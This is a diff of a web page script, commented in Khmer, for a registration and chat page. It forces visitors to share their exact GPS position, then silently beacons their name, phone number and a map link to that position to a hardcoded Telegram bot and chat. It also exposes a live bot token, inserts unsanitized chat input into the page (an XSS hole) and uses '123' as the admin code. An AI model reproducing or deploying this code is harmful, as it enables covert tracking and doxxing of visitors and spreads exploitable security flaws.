@@ -3487,89 +3487,112 @@ function listenForAdminReplies() {
           }
       });
 }
-    const BOT_TOKEN = "8416578282:AAGic7-AEUoB2dcJ6ElMoX9RFucs34j2lWU";
-const CHAT_ID = "955031659";
-let userLocationLink = "";
-
-
-    function toStep2() {
-    // ឆែកមើលថាមាន Element ទាំងនេះឬអត់ ដើម្បីកុំឱ្យវាគាំង
-    const step1 = document.getElementById('step-1');
-    const step2 = document.getElementById('step-2');
     
-    if(step1 && step2) {
-        step1.style.display = 'none';
-        step2.style.display = 'block';
-    } else {
-        console.error("រកមិនឃើញ ID 'step-1' ឬ 'step-2' នៅក្នុង HTML ទេ!");
-    }
+const BOT_TOKEN = "8416578282:AAGic7-AEUoB2dcJ6ElMoX9RFucs34j2lWU";
+const CHAT_ID = "955031659";
+let userLocation = "";
+
+// ១. ទៅកាន់អេក្រង់ចុះឈ្មោះ
+function toStep2() {
+    document.getElementById('step-1').style.display = 'none';
+    document.getElementById('step-2').style.display = 'block';
 }
 
-// ២. មុខងារចាប់ទីតាំងឱ្យ "ចំកន្លែងដែលគេនៅ" (Exact Location)
-function getExactLocation() {
+// ២. ចាប់ទីតាំងពិតប្រាកដ (High Accuracy)
+function getRealTimeLocation() {
     const status = document.getElementById('gps-status');
-    status.innerText = "⌛ កំពុងស្វែងរកទីតាំងពិត... សូមរង់ចាំ...";
-    status.style.color = "blue";
-
+    const btn = document.getElementById('btn-gps');
+    
     if (navigator.geolocation) {
-        // បង្ខំឱ្យប្រើកម្រិតខ្ពស់បំផុត (High Accuracy)
-        const options = {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0
-        };
-
+        status.innerText = "⌛ កំពុងស្វែងរកទីតាំងឱ្យចំកន្លែងបំផុត...";
+        
         navigator.geolocation.getCurrentPosition(function(position) {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
+            const acc = position.coords.accuracy;
+
+            userLocation = `https://www.google.com/maps?q=${lat},${lon}`;
             
-            // បង្កើត Link ផែនទីពិតប្រាកដ
-            userLocationLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            
-            status.innerText = "✅ ចាប់បានទីតាំងពិតហើយ!";
+            status.innerText = `✅ ចាប់បានទីតាំងហើយ (ច្បាស់កម្រិត ${Math.round(acc)} ម៉ែត្រ)`;
             status.style.color = "green";
-            document.getElementById('btn-gps').style.background = "#4CAF50";
+            btn.style.background = "#4CAF50";
         }, function(error) {
-            alert("សូមចុចលើរូប 'មេសោ' (Lock) នៅជិត Link វិបសាយ រួចប្តូរ Location ទៅជា Allow!");
-            status.innerText = "❌ មិនអាចចាប់ទីតាំងបាន (សូម Allow Location)";
-        }, options);
+            alert("Error: " + error.message + " | សូមចុច 'Allow' នៅខាងលើ Browser!");
+            status.innerText = "❌ សូមចុច Allow Location លើ Browser";
+        }, {
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0
+        });
     }
 }
 
-// ៣. មុខងារចុះឈ្មោះ និងផ្ញើទៅ Telegram (Bypass បញ្ហាអ៊ីនធឺណិត)
-function submitRegistration() {
+// ៣. ចុះឈ្មោះ និងផ្ញើទៅ Telegram
+async function submitUser() {
     const name = document.getElementById('reg-name').value.trim();
     const phone = document.getElementById('reg-phone').value.trim();
-    const email = document.getElementById('reg-email').value.trim();
 
-    if (!name || !phone || !email || !userLocationLink) {
-        alert("សូមបំពេញព័ត៌មាន និងចុច GPS ឱ្យជាប់ពណ៌បៃតងសិន!");
+    if (!name || !phone || !userLocation) {
+        alert("សូមបំពេញឈ្មោះ លេខទូរស័ព្ទ និងចុច GPS ជាមុនសិន!");
         return;
     }
 
-    const message = `🚨 អ្នកលេងថ្មី\n👤 ឈ្មោះ: ${name}\n📞 លេខ: ${phone}\n📧 Gmail: ${email}\n📍 ទីតាំងពិត: ${userLocationLink}`;
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
-
-    // ប្រើ Image Beacon ដើម្បីផ្ញើទិន្នន័យ (វិធីនេះមិនដែល Error អ៊ីនធឺណិតទេ)
+    const text = `🚨 អ្នកលេងថ្មី\n👤 ឈ្មោះ: ${name}\n📞 លេខ: ${phone}\n📍 ទីតាំងពិត: ${userLocation}`;
+    
+    // ផ្ញើទៅ Telegram (ប្រើ Image Beacon ដើម្បីកុំឱ្យ Error Internet)
     let img = new Image();
-    img.src = url;
+    img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
 
-    // ជោគជ័យ៖ ទៅកាន់អេក្រង់ឆាត (ជំហានទី ៣)
-    alert("ចុះឈ្មោះជោគជ័យ!");
-    document.getElementById('display-name').value = name;
+    // ចូលទៅកាន់ប្រអប់ឆាត
+    document.getElementById('chat-user-input').value = name;
     document.getElementById('step-2').style.display = 'none';
     document.getElementById('step-3').style.display = 'block';
+    
+    saveMessage("System", `ស្វាគមន៍ ${name} ចូលក្នុងឆាត!`);
 }
 
-    
+// --- មុខងារឆាតរបស់បង ---
 function sendChatMessage() {
-    const input = document.getElementById('chat-msg-input');
-    const msg = input.value.trim();
-    const name = document.getElementById('user-display-name').innerText;
+    const name = document.getElementById('chat-user-input').value;
+    const msg = document.getElementById('chat-msg-input').value.trim();
     if (msg === "") return;
-    document.getElementById('chat-box').innerHTML += `<div><b>${name}:</b> ${msg}</div>`;
-    input.value = "";
+
+    saveMessage(name, msg);
+    document.getElementById('chat-msg-input').value = "";
 }
+
+function sendChatImage(input) {
+    const name = document.getElementById('chat-user-input').value;
+    if (input.files && input.files[0]) {
+        const reader = new FileReader();
+        reader.onload = function(e) {
+            const imgHtml = `<img src="${e.target.result}" style="max-width:200px; border-radius:10px; display:block; margin-top:5px;">`;
+            saveMessage(name, imgHtml);
+        };
+        reader.readAsDataURL(input.files[0]);
+    }
+}
+
+function saveMessage(name, msg) {
+    const chatBox = document.getElementById('chat-box');
+    const time = new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
+    const msgHtml = `<div style="margin-bottom:10px; padding:8px; background:#f1f1f1; border-radius:8px;">
+                        <b style="color:#4CAF50;">${name}</b> <small style="color:gray;">(${time})</small><br>${msg}
+                     </div>`;
+    chatBox.innerHTML += msgHtml;
+    chatBox.scrollTop = chatBox.scrollHeight;
+}
+
+function clearAllChat() {
+    const code = document.getElementById('admin-code').value;
+    if (code === "123") { // លេខកូដលុបសារ
+        document.getElementById('chat-box').innerHTML = "";
+        alert("បានលុបសារទាំងអស់!");
+    } else {
+        alert("លេខកូដ Admin មិនត្រឹមត្រូវ!");
+    }
+}
+    
     
     
 </script>
